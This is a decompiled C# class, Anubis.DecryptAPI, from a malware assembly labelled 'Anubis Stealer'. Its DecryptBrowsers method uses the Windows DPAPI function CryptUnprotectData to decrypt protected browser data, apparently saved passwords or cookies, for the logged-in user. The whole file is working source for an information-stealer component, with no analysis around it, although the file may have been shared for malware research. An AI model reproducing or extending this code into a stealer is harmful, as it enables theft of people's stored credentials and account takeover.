// Decompiled with JetBrains decompiler
// Type: Anubis.DecryptAPI
// Assembly: Anubis Stealer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4CC1199D-65A9-4D34-AA4B-98216B1632A3
// Assembly location: C:\Users\Administrator\Downloads\Build.exe

using System;
using System.Runtime.InteropServices;

namespace Anubis
{
  internal class DecryptAPI
  {
    public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
    {
      DecryptAPI.DataBlob pPlainText = new DecryptAPI.DataBlob();
      DecryptAPI.DataBlob pCipherText = new DecryptAPI.DataBlob();
      DecryptAPI.DataBlob pEntropy = new DecryptAPI.DataBlob();
      DecryptAPI.CryptprotectPromptstruct pPrompt = new DecryptAPI.CryptprotectPromptstruct()
      {
        cbSize = Marshal.SizeOf(typeof (DecryptAPI.CryptprotectPromptstruct)),
        dwPromptFlags = 0,
        hwndApp = IntPtr.Zero,
        szPrompt = (string) null
      };
      string empty = string.Empty;
      try
      {
        try
        {
          if (cipherTextBytes == null)
            cipherTextBytes = new byte[0];
          pCipherText.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
          pCipherText.cbData = cipherTextBytes.Length;
          Marshal.Copy(cipherTextBytes, 0, pCipherText.pbData, cipherTextBytes.Length);
        }
        catch
        {
        }
        try
        {
          if (entropyBytes == null)
            entropyBytes = new byte[0];
          pEntropy.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
          pEntropy.cbData = entropyBytes.Length;
          Marshal.Copy(entropyBytes, 0, pEntropy.pbData, entropyBytes.Length);
        }
        catch
        {
        }
        DecryptAPI.CryptUnprotectData(ref pCipherText, ref empty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
        byte[] destination = new byte[pPlainText.cbData];
        Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
        return destination;
      }
      catch
      {
      }
      finally
      {
        if (pPlainText.pbData != IntPtr.Zero)
          Marshal.FreeHGlobal(pPlainText.pbData);
        if (pCipherText.pbData != IntPtr.Zero)
          Marshal.FreeHGlobal(pCipherText.pbData);
        if (pEntropy.pbData != IntPtr.Zero)
          Marshal.FreeHGlobal(pEntropy.pbData);
      }
      return new byte[0];
    }

    [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptUnprotectData(
      ref DecryptAPI.DataBlob pCipherText,
      ref string pszDescription,
      ref DecryptAPI.DataBlob pEntropy,
      IntPtr pReserved,
      ref DecryptAPI.CryptprotectPromptstruct pPrompt,
      int dwFlags,
      ref DecryptAPI.DataBlob pPlainText);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct DataBlob
    {
      public int cbData;
      public IntPtr pbData;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct CryptprotectPromptstruct
    {
      public int cbSize;
      public int dwPromptFlags;
      public IntPtr hwndApp;
      public string szPrompt;
    }
  }
}
